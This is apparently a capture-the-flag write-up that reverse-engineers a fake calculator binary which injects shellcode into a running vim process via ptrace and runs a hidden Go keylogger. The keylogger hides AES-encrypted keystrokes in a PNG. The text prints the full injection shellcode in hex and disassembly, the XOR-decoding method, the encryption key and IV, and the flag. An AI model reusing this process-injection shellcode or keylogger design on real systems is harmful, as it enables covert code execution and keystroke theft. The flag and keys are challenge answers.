# Solution

There are multiple files in this challenge:
- cubes011 - stripped ELF executable
- cube.png - PNG image data

Running `cubes011` we see a badly implemented conversion calculator:
```
$ ./cube 
---------------------------------
---- On-prem EURO calculator ----
---------------------------------
Input HRK: 100
EUR: 13.272281
More? (Y/n) Input HRK: n
EUR: 13.272281
More? (Y/n) 
Input HRK: n
EUR: 13.272281
More? (Y/n) n
```

Other than that, there is nothing out of the ordinary. Running it with `strace` there is an odd behaviour where binary is crawling `/proc` before execution:
```
...
openat(AT_FDCWD, "/proc/114/status", O_RDONLY) = 4
read(4, "Name:\tscsi_tmf_1\nUmask:\t0000\nSta"..., 2048) = 999
close(4)                                = 0
newfstatat(AT_FDCWD, "/proc/115", {st_mode=S_IFDIR|0555, st_size=0, ...}, 0) = 0
openat(AT_FDCWD, "/proc/115/stat", O_RDONLY) = 4
read(4, "115 (kworker/3:1-events) I 2 0 0"..., 2048) = 165
close(4)                                = 0
openat(AT_FDCWD, "/proc/115/statm", O_RDONLY) = 4
read(4, "0 0 0 0 0 0 0\n", 2048)        = 14
close(4)                                = 0
openat(AT_FDCWD, "/proc/115/status", O_RDONLY) = 4
read(4, "Name:\tkworker/3:1-events\nUmask:\t"..., 2048) = 1009
close(4)                                = 0
newfstatat(AT_FDCWD, "/proc/116", {st_mode=S_IFDIR|0555, st_size=0, ...}, 0) = 0
openat(AT_FDCWD, "/proc/116/stat", O_RDONLY) = 4
read(4, "116 (kworker/u8:3-kcryptd/253:0)"..., 2048) = 177
close(4)    
...
```

If there is `vim` running in parallel there is also a weird `PTRACE_ATTACH` being issued:
```
openat(AT_FDCWD, "/proc/5435/status", O_RDONLY) = 4
read(4, "Name:\tvim\nUmask:\t0002\nState:\tS ("..., 2048) = 1420
close(4)                                = 0
openat(AT_FDCWD, "/proc/5435/maps", O_RDONLY) = 4
newfstatat(4, "", {st_mode=S_IFREG|0444, st_size=0, ...}, AT_EMPTY_PATH) = 0
read(4, "5647bb564000-5647bb59b000 r--p 0"..., 1024) = 1024
ptrace(PTRACE_ATTACH, 5435)             = -1 EPERM (Operation not permitted)
```

Anyway, the only way to identify what this binary precisely does is by reversing it.

## PTRACE calls

While reversing the binary, one can observe functions in addition to the "main" and "conversion" function which perform a lot of PTRACE related calls, the most important one being `PTRACE_POKETEXT`:
```
undefined8 FUN_0010150d(uint param_1,undefined8 *param_2,long param_3,ulong param_4)

{
  long lVar1;
  undefined8 *local_28;
  ulong local_10;
  
  local_10 = 0;
  local_28 = param_2;
  while( true ) {
    if (param_4 <= local_10) {
      return 0;
    }
    lVar1 = ptrace(PTRACE_POKETEXT,(ulong)param_1,param_3 + local_10,*local_28);
    if (lVar1 < 0) break;
    local_10 = local_10 + 8;
    local_28 = local_28 + 1;
  }
  return 0xffffffff;
}
```

This particular `ptrace` call reveals that there is a program which is being attached by the `cube` binary and its instructions are most probably altered with `PTRACE_POKETEXT`. This is a known linux process injection technique via ptrace. The calling functions should be inspected further to try and reveal where is data to write located. Specifically `FUN_00101586` holds a reference towards `FUN_00101586` which is passed as a parameter to the `PTRACE_POKETEXT` function. Its content looks a lot like shellcode:
```
pwndbg> x/24s 0x555555558020
0x555555558020:	"H1\377H1\300WH\277cubes011WH\211\347H1\366H1Ұ\002\017\005I\211\300H1\300\260\tH1\377H1\366@\266\032H\301\346\b@\266`H\301\346\b\262\003M1\322A\262\002M1\311A\261@I\301\341\b\017\005PL\211\307H1\300\260\003\017\005H1\366VH\211\347H1\300f\270?\001\017\005H\211\303XXH1\377H1\366H1Ҳ\032H\301\342\b\262`H\301\342\bH9\326}\021@\212<0@\200\367A@\210<0H\377\306\353\352H\211\306H\211\337H1\300H\377\300\017\005H1\322H1\366RH\277lf/fd//3WH\277/proc/seWH\211", <incomplete sequence \347>...
0x5555555580e8:	"H1\300\260;\017\005H1\377H1\300\260<\017\005"
```

Or in hex:
```
4831ff4831c05748bf6375626573303131574889e74831f64831d2b0020f054989c04831c0b0094831ff4831f640b61a48c1e60840b66048c1e608b2034d31d241b2024d31c941b14049c1e1080f05504c89c74831c0b0030f054831f6564889e74831c066b83f010f054889c358584831ff4831f64831d2b21a48c1e208b26048c1e2084839d67d11408a3c304080f74140883c3048ffc6ebea4889c64889df4831c048ffc00f054831d24831f65248bf6c662f66642f2f335748bf2f70726f632f7365574889e74831c0b03b0f054831ff4831c0b03c0f05
```

We will return to this shellcode later. What participants should also note is that these ptrace calls are initiated as part of the `__DT_INIT_ARRAY` which is an initialization routine executed by the linker when the ELF program is started:
```
                     //
                     // .init_array 
                     // SHT_INIT_ARRAY  [0x3d30 - 0x3d3f]
                     // ram:00103d30-ram:00103d3f
                     //
                     __DT_INIT_ARRAY                                 XREF[4]:     00100168(*), 001002f0(*), 
                                                                                  00103d90(*), 
                                                                                  _elfSectionHeaders::00000550(*)  
00103d30 00 13 10        dq         thunk_FUN_00101280
         00 00 00 
         00 00
00103d38 2a 18 10        dq         FUN_0010182a
         00 00 00 
         00 00
```

Furthermore, the init function searches for a running `vim` instance as seen in the first function call:
```
uVar2 = openproc(0x61);
memset(local_428,0,0x410);
do {
  lVar3 = readproc(uVar2,local_428);
  if (lVar3 == 0) {
    closeproc(uVar2);
    local_428[0] = 0;
    break;
  }
  iVar1 = strcmp(acStack_120,"vim");
} while (iVar1 != 0);
```

After virtual memory maps are parsed for a map with flags `r-xp` in function `FUN_00101309`, function `FUN_00101586` will attach to the running `vim` instance with `PTRACE_ATTACH`, write the shellcode into the available `r-xp` map and reroute execution to shellcode.

## Disassembling shellcode

Content we have retrieved previously can be disassembled with `ndisasm`:
```
echo -ne '4831ff4831c05748bf6375626573303131574889e74831f64831d2b0020f054989c04831c0b0094831ff4831f640b61a48c1e60840b66048c1e608b2034d31d241b2024d31c941b14049c1e1080f05504c89c74831c0b0030f054831f6564889e74831c066b83f010f054889c358584831ff4831f64831d2b21a48c1e208b26048c1e2084839d67d11408a3c304080f74140883c3048ffc6ebea4889c64889df4831c048ffc00f054831d24831f65248bf6c662f66642f2f335748bf2f70726f632f7365574889e74831c0b03b0f054831ff4831c0b03c0f05' | xxd -r -p | ndisasm -b64 -
00000000  4831FF            xor rdi,rdi
00000003  4831C0            xor rax,rax
00000006  57                push rdi
00000007  48BF637562657330  mov rdi,0x3131307365627563
         -3131
00000011  57                push rdi
00000012  4889E7            mov rdi,rsp
00000015  4831F6            xor rsi,rsi
00000018  4831D2            xor rdx,rdx
0000001B  B002              mov al,0x2
0000001D  0F05              syscall
0000001F  4989C0            mov r8,rax
00000022  4831C0            xor rax,rax
00000025  B009              mov al,0x9
00000027  4831FF            xor rdi,rdi
0000002A  4831F6            xor rsi,rsi
0000002D  40B61A            mov sil,0x1a
00000030  48C1E608          shl rsi,byte 0x8
00000034  40B660            mov sil,0x60
00000037  48C1E608          shl rsi,byte 0x8
0000003B  B203              mov dl,0x3
0000003D  4D31D2            xor r10,r10
00000040  41B202            mov r10b,0x2
00000043  4D31C9            xor r9,r9
00000046  41B140            mov r9b,0x40
00000049  49C1E108          shl r9,byte 0x8
0000004D  0F05              syscall
0000004F  50                push rax
00000050  4C89C7            mov rdi,r8
00000053  4831C0            xor rax,rax
00000056  B003              mov al,0x3
00000058  0F05              syscall
0000005A  4831F6            xor rsi,rsi
0000005D  56                push rsi
0000005E  4889E7            mov rdi,rsp
00000061  4831C0            xor rax,rax
00000064  66B83F01          mov ax,0x13f
00000068  0F05              syscall
0000006A  4889C3            mov rbx,rax
0000006D  58                pop rax
0000006E  58                pop rax
0000006F  4831FF            xor rdi,rdi
00000072  4831F6            xor rsi,rsi
00000075  4831D2            xor rdx,rdx
00000078  B21A              mov dl,0x1a
0000007A  48C1E208          shl rdx,byte 0x8
0000007E  B260              mov dl,0x60
00000080  48C1E208          shl rdx,byte 0x8
00000084  4839D6            cmp rsi,rdx
00000087  7D11              jnl 0x9a
00000089  408A3C30          mov dil,[rax+rsi]
0000008D  4080F741          xor dil,0x41
00000091  40883C30          mov [rax+rsi],dil
00000095  48FFC6            inc rsi
00000098  EBEA              jmp short 0x84
0000009A  4889C6            mov rsi,rax
0000009D  4889DF            mov rdi,rbx
000000A0  4831C0            xor rax,rax
000000A3  48FFC0            inc rax
000000A6  0F05              syscall
000000A8  4831D2            xor rdx,rdx
000000AB  4831F6            xor rsi,rsi
000000AE  52                push rdx
000000AF  48BF6C662F66642F  mov rdi,0x332f2f64662f666c
         -2F33
000000B9  57                push rdi
000000BA  48BF2F70726F632F  mov rdi,0x65732f636f72702f
         -7365
000000C4  57                push rdi
000000C5  4889E7            mov rdi,rsp
000000C8  4831C0            xor rax,rax
000000CB  B03B              mov al,0x3b
000000CD  0F05              syscall
000000CF  4831FF            xor rdi,rdi
000000D2  4831C0            xor rax,rax
000000D5  B03C              mov al,0x3c
000000D7  0F05              syscall
```

Analysing shellcode syscalls, one should note the following:
- shellcode is opening a file "cubes011" (itself)
- there is an mmap call mapping "cubes011" into memory
  - there is an offset of 0x4000 where the mapping starts
  - the memory region is xor'd with 0x41 after loading
- shellcode calls memfd_create to create an in-memory fd
- in-memory decoded "cubes011" is executed with execve call

This would ultimately mean that the running `vim` instance is injected with the shellcode which creates a memfd of decoded content located in "cubes011" at offset 0x4000.

## Extracting memfd program

If we are aware of what the shellcode does, extracting it should be very easy with Python:
```
$ python3
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('cubes011', 'rb') as fp:
...     cubes = fp.read()
... 
>>> with open('decoded', 'wb') as fp:
...     fp.write(bytes([i^0x41 for i in cubes[0x4000:]]))
... 
1728512
>>>
$ file decoded
decoded: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=1rx6vYTTx6sed6l3OLit/04EDvmSzUZcTwkiDdgbg/qkvh8H1hnPJkXPRz-kUa/6qcYEJS6gd3wjMxZVJVa, stripped
```

When the file is extracted and decoded, the last piece of the puzzle is to disassemble and reverse it.

## Disassembling memfd program

Running the extracted binary will yield different results, so reversing it would be the best way forward. The binary is stripped, but GoReSym can easily reconstruct its symbols. After reconstruction and reversing, these should be the most important points:
- executed binary runs a keylogger
- input is monitored until the process is interrupted
- collected input is encrypted with AES CTR
  - key used is mce3Ej10xk3Aqw19
  - iv used is kdE39vn1S0EE3kcm
- encrypted input is embedded into the rectangle PNG with go-steganography

The collected input is stored using a specific format:
```
BYTE1|BYTE2|BYTE3
BYTE1 = either 0x70 or 0x72 (key press or key release)
(BYTE2<<8+BYTE3) = value of the key code that was pressed or released
```

## Putting everything together to get the flag

The last file `cube.png` sits right in place after `cubes011` is completely disassembled. In order to get the flag, one must extract the encrypted content via go-steganography (or any LSB stego implementation) and decrypt using specified key and IV. Decrypted content will reveal flag in the keylogger log:
```
$ go run main.go
[r]: ENTER
[p]: I
[r]: I
[p]: B
[r]: B
[p]: C
[r]: C
[p]: T
[r]: T
[p]: F
[r]: F
[p]: L_SHIFT
[p]: [
[r]: [
[r]: L_SHIFT
[p]: 1
[r]: 1
[p]: N
[r]: N
[p]: -
[r]: -
[p]: T
[r]: T
[p]: H
[r]: H
[p]: 3
[r]: 3
[p]: L_SHIFT
[p]: -
[r]: -
[r]: L_SHIFT
[p]: 3
[r]: 3
[p]: N
[r]: N
[p]: D
[r]: D
[p]: -
[r]: -
[p]: 1
[r]: 1
[p]: T
[r]: T
[p]: Z
[r]: Z
[p]: L_SHIFT
[p]: Z
[r]: Z
[r]: L_SHIFT
[p]: L_SHIFT
[p]: -
[r]: -
[r]: L_SHIFT
[p]: J
[r]: J
[p]: U
[r]: U
[p]: S
[r]: S
[p]: T
[r]: T
[p]: -
[r]: -
[p]: 4
[r]: 4
[p]: -
[r]: -
[p]: F
[r]: F
[p]: 3
[r]: 3
[p]: W
[r]: W
[p]: L_SHIFT
[p]: -
[r]: -
[r]: L_SHIFT
[p]: C
[r]: C
[p]: U
[r]: U
[p]: B
[r]: B
[p]: 3
[r]: 3
[p]: L_SHIFT
[p]: L_SHIFT
[p]: L_SHIFT
[p]: Z
[r]: Z
[r]: L_SHIFT
[p]: L_SHIFT
[p]: ]
[r]: ]
[r]: L_SHIFT
[p]: P
[r]: P
[p]: S
[p]: SPACE
[r]: S
[r]: SPACE
[p]: U
[p]: A
[r]: U
[p]: X
[r]: A
[r]: X
[p]: ENTER
[r]: ENTER
[p]: S
[p]: U
[r]: S
[r]: U
[p]: D
[r]: D
[p]: O
[r]: O
[p]: SPACE
[r]: SPACE
[p]: K
[r]: K
[p]: I
[r]: I
[p]: L
[r]: L
[p]: L
[r]: L
[p]: SPACE
[r]: SPACE
[p]: -
[r]: -
[p]: 2
[r]: 2
[p]: SPACE
[r]: SPACE
[p]: 5
[r]: 5
[p]: 2
[r]: 2
[p]: 6
[r]: 6
[p]: 1
[r]: 1
[p]: 1
[r]: 1
[p]: ENTER
[r]: ENTER
[p]: V
[r]: V
[p]: M
[r]: M
[p]: ENTER
[r]: ENTER
[p]: ENTER
[r]: ENTER
[p]: P
[r]: P
[p]: S
[p]: SPACE
[r]: S
[r]: SPACE
[p]: U
[p]: A
[r]: U
[r]: A
[p]: X
[r]: X
[p]: ENTER
[r]: ENTER
[p]: S
[p]: U
[r]: S
[r]: U
[p]: D
[r]: D
[p]: O
[p]: SPACE
[r]: O
[r]: SPACE
[p]: K
[r]: K
[p]: I
[r]: I
[p]: L
[r]: L
[p]: L
[r]: L
[p]: SPACE
[r]: SPACE
[p]: -
[r]: -
[p]: 2
[r]: 2
[p]: SPACE
[r]: SPACE
[p]: 5
[r]: 5
[p]: 2
[r]: 2
[p]: 6
[r]: 6
[p]: 0
[r]: 0
[p]: 8
[r]: 8
[p]: ENTER
```

Decryption program that reveals the flag is in the `decoder` folder.
```
ibctf{1n-th3_3nd-1tzZ_just-4-f3w_cub3Z}
```
